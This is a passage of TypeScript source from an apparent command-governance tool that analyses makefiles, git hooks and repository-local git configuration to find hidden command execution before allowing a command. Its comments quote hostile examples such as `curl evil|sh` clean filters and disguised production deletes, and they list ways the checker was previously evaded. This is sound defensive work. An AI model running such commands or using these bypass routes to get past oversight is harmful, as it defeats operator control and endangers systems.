      else openConditions.push(`conditional: ${trimmed}`);
      // A CONDITIONAL DOES NOT END THE RULE IT SITS INSIDE. make allows `ifeq` at column 0 in the middle of a
      // recipe, and the recipe lines under it still belong to that target — clearing `current` dropped every one
      // of them, so the guarded branch of a real recipe simply disappeared (exit review 6). Both branches are
      // kept, which is the same rule this resolver already applies to a conditional around whole rules.
      continue;
    }
    if (/^(vpath|VPATH\s*[:+?]?=)/.test(trimmed)) model.unsupported.push(`VPATH: ${trimmed}`);
    // an assignment that redefines the interpreter or the lookup path for EVERY recipe line
    // a rebinding assignment can be global, `override`-ed, `export`-ed, or TARGET-SPECIFIC (`build: SHELL := x`),
    // and anchoring at line start saw only the first shape
    // `SHELL := /bin/bash` is the single most common line in a real makefile and names a system shell, not a
    // rebinding. Only an assignment naming something ELSE — a relative path, a repository program, a variable —
    // re-points what the recipe runs. Treating every SHELL assignment as a rebind made every target of every
    // such makefile ask (exit review 2).
    // `build:: SHELL = …` is a target-specific rebind on a DOUBLE-COLON rule, and the optional target prefix
    // matched only a single colon; `SHELL != …` and `SHELL ::= …` are the same rebind by another operator.
    const assign = /^(?:[^:=#]+::?\s*)?(?:override\s+|export\s+)*(SHELL|\.SHELLFLAGS|PATH)\s*(?:::?|[+?!])?=\s*(.*)$/.exec(
      trimmed,
    );
    if (assign && !isOrdinaryShellAssignment(assign[1]!, assign[2]!)) model.rebinds.push(trimmed);
    // EVERY variable, not only the ones that rebind execution: a recipe's `$(VAR)` is substituted with the value
    // make will splice in, and a value carrying `;` or `&&` really does become new commands (exit review 4).
    const anyAssign = /^(?:override\s+|export\s+|unexport\s+)*([A-Za-z_][A-Za-z0-9_.]*)\s*(::?=|[+?!]=|=)\s*([\s\S]*)$/.exec(
      trimmed,
    );
    if (anyAssign) {
      const [, name, op, value] = anyAssign as unknown as [string, string, string, string];
      // `?=` IS CONDITIONAL: it sets the variable only when it has no value yet. Treating it as a plain set let
      // `KUBECTL = <production delete>` be overwritten by a following `KUBECTL ?= echo skipped`, and the recipe
      // was analysed with the harmless value while make ran the real one (exit review 8).
      if (op === '?=' && model.vars.has(name)) continue;
      // ...and INSIDE A CONDITIONAL, EVERY BRANCH IS POSSIBLE. The resolver keeps both branches on purpose,
      // because it cannot always evaluate the condition — so neither the first nor the last assignment may be
      // the only one considered. `ifeq ($(ENV),)` / `CMD = <production delete>` / `else` / `CMD = echo local`
      // was analysed as `echo local` while make, with ENV unset, ran the delete (exit review 8); keeping only
      // the first would lose the mirror case, where the effect is in the `else`. Both values are recorded and
      // the recipe is expanded with each.
      if (openConditions.length) {
        const alts = model.altVars.get(name) ?? new Set<string>();
        const prior = model.vars.get(name);
        if (prior !== undefined) alts.add(prior);
        alts.add(value);
        model.altVars.set(name, alts);
      }
      // `override VAR = …` INVERTS make's precedence: the makefile's value wins over `make VAR=…`. Applying the
      // command line last regardless let an attacker-written recipe be read with the operator's harmless value —
      // `make KUBECTL=true ship` was analysed as `true …` while make really ran the makefile's `kubectl
      // --context prod delete deploy api` (exit review 7).
      if (/^override\s/.test(trimmed)) model.overridden.add(name);
      if (/^(export|override\s+export)\s/.test(trimmed)) model.exported.set(name, value);
      const prior = model.vars.get(name);
      // `:=` and `::=` are SIMPLY EXPANDED: the value is fixed HERE, so a later assignment to what it referenced
      // does not change it. Storing the text and expanding it lazily gave every variable recursive flavour, and
      // `B := $(A)` then read A's LAST value rather than its value at this line (exit review 5).
      const simple = op === ':=' || op === '::=';
      const text = simple ? (expandMakeText(value, model.vars).text ?? value) : value;
      model.vars.set(name, op === '+=' && prior !== undefined ? `${prior} ${text}` : text);
      // an assignment expands its right-hand side NOW when it is simply expanded, so a shell function there runs
      if (simple) for (const c of expandMakeText(value, model.vars).ran) model.parseRan.push(c);
      // `X != CMD` IS `$(shell CMD)` BY ANOTHER NAME. GNU make's shell-assignment operator runs the right-hand
      // side through the shell WHILE PARSING — for any goal, and under `make -n` — and the value was being
      // stored as inert text, so `X != git push origin main` pushed and nothing recorded it (exit review 7).
      if (op === '!=') {
        const rhs = expandMakeText(value, model.vars);
        model.parseRan.push(...rhs.ran);
        if (rhs.text !== null && rhs.text.trim()) model.parseRan.push(rhs.text.trim());
        else if (value.trim()) model.parseRan.push(value.trim());
      }
    }
    // `$(shell …)` ANYWHERE outside a recipe runs while make PARSES — for every target, and for `make -n`
    for (const c of expandMakeText(trimmed, model.vars).ran) model.parseRan.push(c);
    // GNU make reads `${…}` and `$(…)` as the SAME reference, and the guard saw only the paren form
    if (/\$[({]eval\b/.test(trimmed)) model.unsupported.push(`$(eval): ${trimmed}`);
    if (/^\.ONESHELL\s*:/.test(trimmed)) {
      // the WHOLE recipe goes to one shell, so a `cd` on one line leaks into the next
      model.oneShell = true;
      current = null;
      continue;
    }
    const goal = /^\.DEFAULT_GOAL\s*[:+?]?=\s*(\S+)/.exec(trimmed);
    if (goal) {
      model.defaultGoal = goal[1]!;
      current = null;
      continue;
    }
    // NOT EVERY TARGET THAT BEGINS WITH A DOT IS SPECIAL. Skipping all of them dropped three real recipes:
    // `.DEFAULT`, which make runs for ANY goal that has no rule of its own; an old-style SUFFIX rule like `.c.o:`,
    // which builds a target no literal rule names; and an ordinary target a project simply chose to call
    // `.deploy`, whose recipe then ran under ALLOW even as a prerequisite (exit review 6). Only the special
    // targets that genuinely define no recipe are skipped, and they are named.
    const MAKE_NO_RECIPE_SPECIALS =
      /^\.(PHONY|SUFFIXES|PRECIOUS|INTERMEDIATE|SECONDARY|SECONDEXPANSION|DELETE_ON_ERROR|IGNORE|LOW_RESOLUTION_TIME|SILENT|EXPORT_ALL_VARIABLES|NOTPARALLEL|POSIX|ONESHELL|DEFAULT_GOAL|RECIPEPREFIX|MAKEFLAGS|NOTINTERMEDIATE)(?=\s*::?|\s*$)/;
    if (MAKE_NO_RECIPE_SPECIALS.test(trimmed)) {
      current = null;
      continue;
    }
    // a rule: `targets [: | ::] prereqs [; recipe]`. A target or prerequisite list built from a variable is
    // recorded as unsupported rather than parsed as a literal name.
    const rule = /^([^:=#]+?)\s*::?(?!=)\s*([^;]*)(?:;(.*))?$/.exec(line);
    // ONLY A TAB MARKS A RECIPE. GNU make accepts a rule line indented with SPACES, and rejecting every
    // whitespace-led line made `  deploy:` invisible: `make deploy` force-pushed under a proven-absent claim
    // (exit review 7).
    if (rule && !/^\t/.test(line)) {
      const targets = rule[1]!.trim().split(/\s+/).filter(Boolean);
      // A TARGET-SPECIFIC VARIABLE IS NOT A PREREQUISITE LIST. `deploy: DOCKER = docker --context production rm
      // -f app` overrides DOCKER for that target's recipes, and it was parsed as a rule whose prerequisites are
      // the words of the assignment — so the recipe `$(DOCKER)` was expanded with the GLOBAL value and the
      // production command it really runs was never seen (exit review 7).
      const tsv = /^(?:override\s+|export\s+)*([A-Za-z_][A-Za-z0-9_.]*)\s*(?:::?|[+?!])?=\s*(.*)$/.exec(rule[2]!.trim());
      if (tsv) {
        for (const t of targets) {
          const m = model.targetVars.get(t) ?? new Map<string, string>();
          m.set(tsv[1]!, tsv[2]!);
          model.targetVars.set(t, m);
        }
        continue;
      }
      const prereqs = rule[2]!.trim().split(/\s+/).filter(Boolean);
      // A target that can build something NO LITERAL RULE DEFINES makes "this goal has no rule, so nothing runs"
      // false. A `%` pattern is one; so are `.DEFAULT`, which make runs for any goal with no rule of its own, and
      // an old-style SUFFIX rule like `.c.o:` — both reached ALLOW by proving a target absent that make in fact
      // builds (exit review 6).
      if (targets.some((t) => /[%$]/.test(t) || /^\.DEFAULT$/i.test(t) || /^\.[A-Za-z0-9_+-]+\.[A-Za-z0-9_+-]+$/.test(t)))
        model.hasPatternRules = true;
      const shared: MakeRule = { recipes: [], prereqs };
      if (rule[3] && rule[3].trim()) shared.recipes.push(rule[3].trim()); // `target: ; cmd` one-line form
      // the recipes array is the LIVE one: the recipe lines that follow this rule are appended to it
      for (const t of targets)
        if (t.includes('%') && !t.includes('$')) model.patternRules.push({ target: t, prereqs, recipes: shared.recipes });
      const localBlind = [...openConditions];
      if (prereqs.some((p) => /[$]/.test(p))) localBlind.push(`computed prerequisites: ${trimmed}`);
      for (const t of targets) {
        if (localBlind.length) model.unsupportedFor.set(t, [...(model.unsupportedFor.get(t) ?? []), ...localBlind]);
        const existing = model.rules.get(t);
        if (existing) {
          // both branches of a conditional, or a `::` rule declared twice: keep EVERY recipe, never the last one
          existing.prereqs.push(...prereqs);
          existing.recipes.push(...shared.recipes);
          current = existing;
        } else {
          model.rules.set(t, shared);
          current = shared;
        }
        if (!model.firstTarget && !t.startsWith('.')) model.firstTarget = t;
      }
      continue;
    }
    current = null;
  }
  // AN INCLUDED MAKEFILE THAT THIS MAKEFILE REMAKES IS A PRE-IMAGE. make remakes it, then RE-EXECUTES itself
  // with the new content, so what this parser read is not what will run — a `deploy:` that did not exist when
  // EGO looked now pushes to the remote (exit review 7).
  for (const name of included)
    if (model.rules.has(name)) model.unsupported.push(`an included makefile is remade by this makefile: ${name}`);
  return model;
}

/** The default makefile `make` would open in `dir`, in GNU make's precedence order, named by its REAL directory
 *  entry so path comparisons hold on case-insensitive filesystems. */
function defaultMakefile(dir: string): string[] {
  let entries: string[];
  try {
    entries = readdirSync(dir);
  } catch {
    return [];
  }
  const byLower = new Map<string, string>();
  for (const e of entries) if (!byLower.has(e.toLowerCase())) byLower.set(e.toLowerCase(), e);
  for (const name of ['GNUmakefile', 'makefile', 'Makefile']) {
    const real = entries.includes(name) ? name : byLower.get(name.toLowerCase());
    if (real && fileExists(join(dir, real))) return [join(dir, real)];
  }
  return [];
}

/* AMBIENT EXECUTION CLOSURE, INDEXED BY EVENT.
 *
 * Modelling hooks as `verb -> hook names` is wrong about git: `reference-transaction` fires on ANY ref update and
 * `post-index-change` on any index change, whatever the verb that caused it, and several verbs raise events the
 * table did not list (challenge 6, findings 30, 31). The closure is therefore computed in two steps — the SEMANTIC
 * EVENTS an operation raises, then the hooks those events fire — so a verb added later only has to declare what it
 * DOES, and a hook added later only has to declare what it listens to.
 */
type GitEvent =
  | 'commit-created'
  | 'commit-message'
  | 'merge'
  | 'checkout'
  | 'rewrite'
  | 'push'
  | 'patch-apply'
  | 'ref-update'
  | 'index-change';

/** What each git verb DOES, semantically. */
const GIT_VERB_EVENTS: Record<string, GitEvent[]> = {
  commit: ['commit-message', 'commit-created', 'ref-update', 'index-change'],
  merge: ['merge', 'commit-message', 'commit-created', 'ref-update', 'index-change'],
  pull: ['merge', 'checkout', 'ref-update', 'index-change'],
  fetch: ['ref-update'],
  checkout: ['checkout', 'ref-update', 'index-change'],
  switch: ['checkout', 'ref-update', 'index-change'],
  restore: ['index-change'],
  add: ['index-change'],
  rm: ['index-change'],
  mv: ['index-change'],
  clone: ['checkout', 'ref-update'],
  rebase: ['rewrite', 'checkout', 'commit-created', 'ref-update', 'index-change'],
  push: ['push', 'ref-update'],
  am: ['patch-apply', 'commit-created', 'ref-update', 'index-change'],
  apply: ['index-change'],
  'cherry-pick': ['commit-message', 'commit-created', 'ref-update', 'index-change'],
  revert: ['commit-message', 'commit-created', 'ref-update', 'index-change'],
  stash: ['index-change', 'ref-update'],
  reset: ['ref-update', 'index-change'],
  branch: ['ref-update'],
  tag: ['ref-update'],
  'update-ref': ['ref-update'],
  worktree: ['checkout', 'ref-update'],
  'filter-branch': ['rewrite', 'ref-update'],
  bisect: ['checkout', 'ref-update'],
  // `post-index-change` fires whenever the index is REFRESHED, which `status`, `diff` and `stash list` all do —
  // so a hook installed there ran on the most ordinary read commands while EGO resolved no hook at all and left
  // `git status` at ALLOW (exit review 6).
  status: ['index-change'],
  diff: ['index-change'],
  grep: ['index-change'],
  'ls-files': ['index-change'],
  describe: ['index-change'],
  submodule: ['checkout', 'ref-update', 'index-change'],
  'sparse-checkout': ['checkout', 'index-change'],
  'read-tree': ['index-change'],
  'update-index': ['index-change'],
  'checkout-index': ['index-change'],
  'symbolic-ref': ['ref-update'],
  notes: ['ref-update'],
  replace: ['ref-update'],
  gc: ['ref-update'],
  prune: ['ref-update'],
  'send-pack': ['push', 'ref-update'],
  subtree: ['push', 'ref-update', 'index-change'],
};

/** What each hook listens to. */
const GIT_HOOK_EVENTS: Record<string, GitEvent[]> = {
  'pre-commit': ['commit-created'],
  'prepare-commit-msg': ['commit-message'],
  'commit-msg': ['commit-message'],
  'post-commit': ['commit-created'],
  'pre-merge-commit': ['merge'],
  'post-merge': ['merge'],
  'post-checkout': ['checkout'],
  'pre-rebase': ['rewrite'],
  'post-rewrite': ['rewrite'],
  'pre-push': ['push'],
  'applypatch-msg': ['patch-apply'],
  'pre-applypatch': ['patch-apply'],
  'post-applypatch': ['patch-apply'],
  'reference-transaction': ['ref-update'],
  'post-index-change': ['index-change'],
};

/** The hooks a verb's events fire, minus the events a suppression flag actually bypasses. */
function hooksFor(verb: string, suppressed: readonly GitEvent[] = []): string[] {
  const events = new Set(GIT_VERB_EVENTS[verb] ?? []);
  for (const e of suppressed) events.delete(e);
  // `--no-verify` on a commit bypasses pre-commit and commit-msg; post-commit is NOT a verification hook and runs
  if (suppressed.includes('commit-message')) events.delete('commit-created');
  if (!events.size) return [];
  return Object.entries(GIT_HOOK_EVENTS)
    .filter(([, listens]) => listens.some((e) => events.has(e)))
    .map(([name]) => name);
}

/**
 * AMBIENT EXECUTION CLOSURE for git (A5). Executable content attached to repository STATE rather than named in the
 * command has no producer to invoke: `npm install` lets a dependency install a hook, and the next `git commit`
 * runs it — two individually-ALLOW decisions composing into unanalysed execution (challenge 5, finding 24).
 *
 * EGO's own governance shim is re-rendered and compared byte for byte, so it is recognised by PROVENANCE, not by a
 * producer deciding something is safe: a file identical to what EGO installed delegates to EGO itself and adds no
 * third-party body. Anything else — including the `.pre-ego` hooks the shim chains — is an ordinary body and goes
 * through the canonical analyzer.
 */
function resolveGitAmbient(ctx: EvaluationContext, tokens: string[], env: ExecutionEnvironment): ProducerResult {
  const verb = tokens.slice(1).find((t) => !t.startsWith('-'));
  if (!verb)
    return { kind: 'none', key: 'git:', body: null, reason: 'no verb', resolution: 'ABSENT_VERIFIED' };
  // SUPPRESSION IS PER-EVENT, NOT A SWITCH OVER THE WHOLE CLOSURE. `--no-verify` bypasses the VERIFICATION hooks
  // of one event — pre-commit/commit-msg on a commit, pre-push on a push — and nothing else: post-commit,
  // reference-transaction and post-index-change all still run. And a bare `-n` means `--no-verify` ONLY for
  // commit and push; for fetch it is --no-tags, for pull --no-stat, for merge --no-stat. Treating either as
  // "no hooks at all" turned the entire ambient closure off for every verb (challenge 7, finding 1) — the same
  // meta-defect this phase exists to remove: a rule applied at the place being inspected, missing its siblings.
  const noVerify =
    tokens.includes('--no-verify') || (tokens.includes('-n') && (verb === 'commit' || verb === 'push'));
  const suppressed: GitEvent[] = noVerify ? (verb === 'push' ? ['push'] : ['commit-message']) : [];
  const names = hooksFor(verb, suppressed);
  // PRODUCER SUBJECT IDENTITY. Every provenance leg asks "is this INPUT resolved?"; none asked "is the OBJECT
  // this producer resolved the object the command will act on?". The subject of `git` is the repository git
  // itself would resolve from the effective directory — `git rev-parse --show-toplevel`, adjusted by `-C` — not
  // the registered workspace root. A repository nested inside the workspace made EGO read the OUTER repository's
  // hooks and trust anchor while the INNER one's fired (challenge 8).
  const root = gitSubjectRepository(ctx, tokens, env);
  if (root === null)
    return {
      kind: 'git-ambient',
      key: `git-hooks:unknown:${verb}`,
      body: null,
      reason: `the hooks that \`git ${verb}\` fires live outside any registered repository`,
      resolution: 'AMBIENT_UNRESOLVED',
    };
  // CONFIGURATION CLOSURE for git, independent of the hook table: several config keys name a PROGRAM git runs for
  // ordinary verbs — a clean/smudge filter on add and checkout, a textconv on diff, an fsmonitor on almost
  // everything. They are attached to the REPOSITORY, not to the command, so nothing else in the closure would ever
  // name them (challenge 6, finding 26). A repository that configures none of them is untouched.
  // LOCAL scope only. The operator's own global pager, editor or ssh command is their choice and is not part of
  // the repository's attack surface; gating on it would gate every `git status` on every developer machine. What
  // matters is config an agent or a dependency can write INTO THE CHECKOUT.
  const configPrograms = gitLocalProgramValues(root, verb);
  if (!names.length && configPrograms.length)
    return {
      kind: 'git-ambient',
      key: `git-config-programs:${root}:${verb}`,
      body: configPrograms,
      bodyEnv: childEnvironment(env, { cwd: root, cwdVerified: env.cwdVerified }),
      reason: `programs this repository's git configuration runs for \`git ${verb}\``,
      resolution: 'RESOLVED_COMPLETE',
    };
  if (!names.length)
    return { kind: 'none', key: `git:${verb}`, body: null, reason: 'no hook event', resolution: 'ABSENT_VERIFIED' };
  // Ask git where hooks live instead of guessing `.git/hooks`. `core.hooksPath` (husky v9 sets it to `.husky`) and
  // a LINKED WORKTREE — whose `.git` is a file pointing at the main worktree's common dir — both move them, and
  // guessing made the relocated hook invisible while it still fired (challenge 6, finding 1). The kernel already
  // had the correct resolver; the evaluator was the one layer not using it.
  let dir: string;
  try {
    dir = gitHooksDir(root, gitConfigGet(root, 'core.hooksPath'));
  } catch {
    return {
      kind: 'git-ambient',
      key: `git-hooks:unresolved:${verb}`,
      body: null,
      reason: `the hooks directory \`git ${verb}\` runs from could not be determined`,
      resolution: 'AMBIENT_UNRESOLVED',
    };
  }
  // A hooks directory EGO cannot read is not an absence: something WILL run that was never analysed.
  if (!directoryExists(dir))
    return {
      kind: 'git-ambient',
      key: `git-hooks:${dir}:${verb}`,
      body: null,
      reason: `the hooks directory \`git ${verb}\` runs from (${dir}) does not exist or is not readable`,
      resolution: dir.startsWith(root) ? 'ABSENT_VERIFIED' : 'AMBIENT_UNRESOLVED',
    };
  const body: string[] = [];
  const sources: string[] = [];
  let unresolved: string | null = null;
  body.push(...configPrograms);
  for (const name of names) {
    for (const file of chainedHookFiles(dir, name)) {
      const text = readInsideWorkspace(ctx, file);
      if (text === null) {
        unresolved = `${file} fires on \`git ${verb}\` but could not be read`;
        continue;
      }
      sources.push(file);
      if (text === shimScript(name)) {
        // TRUST IS TRANSITIVE. Recognising this file by identity elides its body — which transfers its closure
        // obligation to whatever it delegates to. The shim `exec`s `.harness/hooks/git-hook.sh`, a file inside the
        // mutable workspace it governs. A trusted entrypoint is only trusted while the WHOLE chain is resolved,
        // fingerprinted, fresh and inside the trust boundary (challenge 7, finding 14).
        const chain = trustChainComplete(ctx, root, env);
        if (chain === null) continue; // chain verified end to end: it delegates to EGO itself and adds no body
        unresolved = chain;
        continue;
      }
      const segs = scriptSegments(text);
      if (segs === null) {
        unresolved = `${file} fires on \`git ${verb}\` and builds its commands dynamically`;
        continue;
      }
      body.push(...segs);
    }
  }
  if (unresolved !== null)
    return {
      kind: 'git-ambient',
      key: `git-hooks:${dir}:${verb}`,
      body: body.length ? body : null,
      bodyEnv: childEnvironment(env, { cwd: root, cwdVerified: env.cwdVerified }),
      reason: unresolved,
      resolution: 'AMBIENT_UNRESOLVED',
    };
  // no hook, or EGO's own shim only (recognised byte for byte): nothing third-party runs, and that IS proven —
  // the directory git will actually use was read, not guessed
  if (!body.length)
    return {
      kind: 'git-ambient',
      key: `git-hooks:${dir}:${verb}`,
      body: null,
      reason: `no hook fires for \`git ${verb}\``,
      resolution: 'ABSENT_VERIFIED',
    };
  return {
    kind: 'git-ambient',
    key: `git-hooks:${dir}:${verb}`,
    body,
    bodyEnv: childEnvironment(env, { cwd: root, cwdVerified: env.cwdVerified }),
    reason: `git hooks fired by \`git ${verb}\``,
    resolution: 'RESOLVED_COMPLETE',
    provenance: { source: sources.join(','), fingerprint: fingerprint(body.join('\n')) },
  };
}

/** Which verbs actually run each configured program. A content filter runs when git materialises or stages
 *  content; a textconv when git renders a diff; an ssh command only on the network verbs. */
const CONFIG_PROGRAM_VERBS: ReadonlyArray<readonly [RegExp, ReadonlySet<string>]> = [
  [
    /^filter\.[^.]+\.(clean|smudge|process)$/i,
    // A CLEAN FILTER RUNS WHENEVER GIT COMPARES THE WORKING TREE TO THE INDEX, which is every verb that reads
    // the tree — `status`, `diff`, `grep`, `ls-files`, `describe` — not only the ones that write it. Git runs
    // the filter to decide whether a stat-dirty file really changed, so `git status` in a repository whose own
    // config names a clean filter executes it (exit review 7).
    // ...but NOT `log`, `show` or `blame`: those read COMMITTED objects, where the content is already clean and
    // no filter runs. The line is the working tree, not "read versus write".
    new Set(['add', 'status', 'diff', 'grep', 'ls-files', 'describe', 'blame', 'cat-file', 'checkout', 'switch', 'restore', 'commit', 'merge', 'stash', 'clone', 'pull', 'reset', 'rm', 'mv', 'apply', 'am', 'cherry-pick', 'rebase', 'revert', 'archive', 'update-index', 'read-tree', 'checkout-index', 'diff-files', 'diff-index', 'sparse-checkout']),
  ],
  [/^diff\.[^.]+\.(textconv|command)$/i, new Set(['diff', 'show', 'log', 'blame', 'difftool', 'range-diff'])],
  [/^core\.fsmonitor$/i, new Set(['status', 'add', 'diff', 'commit', 'checkout', 'switch', 'restore', 'stash'])],
  [/^core\.pager$/i, new Set(['log', 'show', 'diff', 'blame', 'branch', 'tag', 'shortlog', 'grep'])],
  [/^core\.(sshCommand|gitProxy)$/i, new Set(['fetch', 'push', 'pull', 'clone', 'ls-remote', 'submodule', 'remote'])],
  // `remote.<n>.uploadpack` / `receivepack` NAME THE PROGRAM git runs to serve the transfer, and for a local or
  // `file://` remote git runs it on THIS machine (exit review 8).
  [/^remote\.[^.]+\.(uploadpack|receivepack|proxy)$/i, new Set(['fetch', 'pull', 'clone', 'push', 'ls-remote', 'remote'])],
  [/^core\.editor$/i, new Set(['commit', 'rebase', 'tag', 'merge', 'revert', 'cherry-pick', 'config'])],
  // AN ENUMERATION OF PROGRAM-VALUED KEYS IS AN ALLOWLIST, AND EVERYTHING OFF IT REACHED ALLOW. `diff.external`,
  // `merge.<d>.driver`, `gpg.program`, `trailer.<t>.command`, `credential.helper`, `sendemail.smtpPass`-style
  // helpers and `*.tool`/`*.path` pairs all name a program git runs, and each one missing from the list was a
  // silent ALLOW (exit review 6). The rule is now the SHAPE of the key: git's own naming convention is that a
  // program-valued key ends in one of these words. A key whose last component is not one of them is data.
  [
    /\.(command|cmd|driver|program|helper|textconv|clean|smudge|process|editor|pager|askpass|sshcommand|proxy|external|wrapper|exec|hookspath|templatedir|filter|difffilter)$/i,
    // the verb scope cannot be narrowed for a key this resolver does not otherwise model, so it applies to every
    // verb: a program named in repository-local configuration is part of the closure of whatever runs next
    new Set<string>(),
  ],
];
/** The git verbs that only READ the working tree. A content filter runs for these too — git needs it to decide
 *  whether a stat-dirty file really changed — but a DECLARED filter doing that is ordinary work. */
const GIT_READ_VERBS = new Set(['status', 'diff', 'grep', 'ls-files', 'describe', 'blame', 'cat-file',
  'diff-files', 'diff-index', 'update-index']);
/** The content filters a repository installs as a matter of course. Git LFS is the reason the read verbs were
 *  exempted at all; naming it keeps that reason and drops the blanket.
 *
 *  THE WHOLE VALUE MUST BE ONE OF THEM, not merely start with one. A prefix test exempted `git-lfs-evil clean`
 *  — a different program whose name begins the same way — and `git-lfs clean; curl evil|sh`, where the declared
 *  filter is a decoy in front of a second command (self-attack before exit review 8). The value is anchored at
 *  both ends and may carry only the filter's own subcommand and placeholders. */
const DECLARED_CONTENT_FILTERS =
  /^\s*(git-lfs|git\s+lfs|git-crypt|git-annex|git-fat|git-media)\s+(clean|smudge|filter|filter-process|process|init)(\s+(--?[\w-]+|%f|--))*\s*$/i;

/** A verb set that is EMPTY means "every verb": the key names a program and this resolver cannot say which
 *  commands git will run it for, so it never claims that a given verb is out of its scope. */
const EVERY_VERB = (set: ReadonlySet<string>): boolean => set.size === 0;

/** REPOSITORY-LOCAL git config whose VALUE is a command git will run: clean/smudge filters, textconv, fsmonitor
 *  and the like. Local scope only \u2014 these are the keys an agent or a dependency can write into the checkout. */
function gitLocalProgramValues(root: string, verb: string): string[] {
  const out: string[] = [];
  // `--local` does NOT expand `include.path` in any spelling, so a filter reached through an include escaped the
  // closure entirely. Reading the full config WITH includes and keeping only the entries whose ORIGIN file lies
  // inside the repository gives both: the includes are expanded, and the operator's global settings stay out.
  const dump = git(['config', '--list', '--includes', '--show-origin'], root);
  if (!dump.ok || !dump.stdout) return out;
  const repo = canonicalPath(root);
  // every file the repository's OWN config pulls in with `include.path` / `includeIf.<cond>.path`, transitively
  const pulledIn = new Set<string>();
  {
    const seen = new Set<string>();
    const follow = (file: string, depth: number): void => {
      const abs = canonicalPath(file);
      if (depth > 4 || seen.has(abs)) return;
      seen.add(abs);
      let text: string;
      try {
        text = readFileSync(abs, 'utf8');
      } catch {
        return;
      }
      for (const m of text.matchAll(/^\s*path\s*=\s*(.+)$/gim)) {
        const raw = m[1]!.trim().replace(/^["']|["']$/g, '');
        const target = raw.startsWith('~/')
          ? join(homedir(), raw.slice(2))
          : isAbsolute(raw)
            ? raw
            : join(abs.slice(0, abs.lastIndexOf(sep)), raw);
        pulledIn.add(canonicalPath(target));
        follow(target, depth + 1);
      }
    };
    // the repository's own config is `<worktree>/.git/config`; a worktree or submodule keeps a `.git` FILE that
    // points at the real directory, which `git rev-parse --git-dir` resolves
    const gitDir = git(['rev-parse', '--absolute-git-dir'], root);
    const dir = gitDir.ok && gitDir.stdout.trim() ? gitDir.stdout.trim() : join(repo, '.git');
    follow(join(dir, 'config'), 0);
  }
  for (const raw of dump.stdout.split(/\r?\n/)) {
    // `file:<path>\t<key>=<value>`
    const tab = raw.indexOf('\t');
    if (tab < 0) continue;
    const origin = raw.slice(0, tab).replace(/^file:/, '');
    const originAbs = canonicalPath(isAbsolute(origin) ? origin : join(root, origin));
    // THE TEST IS WHO PULLS THE FILE IN, NOT WHERE IT SITS. Dropping every origin outside the repository excludes
    // the operator's own `~/.gitconfig`, which is right — and it also excluded a file the REPOSITORY'S OWN
    // `.git/config` names with `include.path`, which is the repository configuring itself through an indirection.
    // A clean filter reached that way ran on `git add .` at ALLOW (exit review 7).
    if (originAbs !== repo && !originAbs.startsWith(repo + sep) && !pulledIn.has(originAbs)) continue;
    const line = raw.slice(tab + 1);
    const eq = line.indexOf('=');
    if (eq < 0) continue;
    const key = line.slice(0, eq);
    const value = line.slice(eq + 1).trim();
    if (!value || value === 'false' || value === '0') continue;
    // `alias.<n> = !cmd` is a SHELL command git runs for `git <n>`. It sits in the same repository-local config
    // as the filters, and nothing else in the closure would ever name it.
    // ... scoped to the verb actually invoked: a repository with a legitimate `alias.lg = !git log` must not
    // carry that body into every other git command
    const alias = /^alias\.([^.]+)$/i.exec(key);
    if (alias) {
      if (alias[1] === verb && value.startsWith('!')) out.push(value.slice(1));
      continue;
    }
    // ... and each key is scoped to the verbs that actually invoke it. Applying every configured program to
    // every verb made `git status` and `git log` ask in any repository using Git LFS, which configures
    // `filter.lfs.clean` as its ordinary installation.
    // A CONTENT FILTER RUNS ON A READ TOO — and the reason the read verbs were excluded is Git LFS, so that is
    // what the exemption should name. Git runs `filter.<d>.clean` whenever it compares the working tree to the
    // index, which includes `git status` and `git diff`; excluding those verbs for EVERY filter let a hostile
    // `filter.evil.clean = curl …|sh` run under an ALLOW (exit review 7), while the decision that created the
    // exclusion was about `filter.lfs.clean`, which every LFS repository installs as a matter of course. So the
    // DECLARED content filters keep the exemption on the read verbs and an unknown program does not.
    const scope = CONFIG_PROGRAM_VERBS.find(([re]) => re.test(key));
    const isContentFilter = /^filter\.[^.]+\.(clean|smudge|process)$/i.test(key);
    if (isContentFilter && GIT_READ_VERBS.has(verb) && DECLARED_CONTENT_FILTERS.test(value)) continue;
    if (scope && EVERY_VERB(scope[1])) {
      out.push(value);
      continue;
    }
    if (scope && scope[1].has(verb)) out.push(value);
  }
  return out;
}

/** Verifies EGO's own delegation chain: the hook shim execs `.harness/hooks/git-hook.sh`, which `ego init` copies
 *  byte for byte from `<package>/runtime/posix/git-hook.sh`. Returns null when the chain is complete, or the reason
 *  it is not — a missing, unreadable, modified or stale delegate is an unanalysed body, not a trusted one. */
function trustChainComplete(ctx: EvaluationContext, root: string, env: ExecutionEnvironment): string | null {
  // The shim itself tries TWO bases: this worktree, and the MAIN worktree resolved from the shared git common
  // dir — a linked worktree shares `.git/hooks` but keeps its own, untracked `.harness/`. Checking only the first
  // made every commit in a linked worktree ask, which is EGO's own habitat (challenge 8, finding 22).
  const bases = [root];
  const common = gitCommonDir(root);
  if (common !== null) bases.push(common);
  const delegate = bases
    .map((b) => join(b, '.harness', 'hooks', 'git-hook.sh'))
    .find((f) => fileExists(f));
  if (delegate === undefined)
    return `${join(root, '.harness', 'hooks', 'git-hook.sh')} is the shim's delegate and is missing`;
  if (env.written.has('\0any') || env.written.has(canonicalPath(delegate)) || !env.treeFresh)
    return `${delegate} is the shim's delegate and this command may have replaced it`;
  const actual = readInsideWorkspace(ctx, delegate);
  if (actual === null) return `${delegate} is the shim's delegate and could not be read`;
  let shipped: string;
  try {
    shipped = readFileSync(join(packageRoot(), 'runtime', 'posix', 'git-hook.sh'), 'utf8');
  } catch {
    return `${delegate} is the shim's delegate and EGO's own copy of it could not be read for comparison`;
  }
  return actual === shipped ? null : `${delegate} is the shim's delegate and does not match what EGO installed`;
}

/** Every file `git <verb>` will execute for one hook name: the hook itself plus the `<name>.pre-ego*` chain EGO's
 *  own shim execs. Reading only the exact `<name>.pre-ego` missed `<name>.pre-ego.1` (challenge 6, finding 32). */
function chainedHookFiles(dir: string, name: string): string[] {
  const out: string[] = [];
  if (fileExists(join(dir, name))) out.push(join(dir, name));
  let entries: string[];
  try {
    entries = readdirSync(dir);
  } catch {
    return out;
  }
  for (const e of entries.sort())
    if (e === `${name}.pre-ego` || e.startsWith(`${name}.pre-ego.`)) out.push(join(dir, e));
  return out;
}

const gitCommonDirCache = new Map<string, string | null>();
/** The MAIN worktree of a linked worktree: the parent of the shared git common dir. Memoised like the toplevel. */
function gitCommonDir(dir: string): string | null {
  const key = canonicalPath(dir);
  const hit = gitCommonDirCache.get(key);
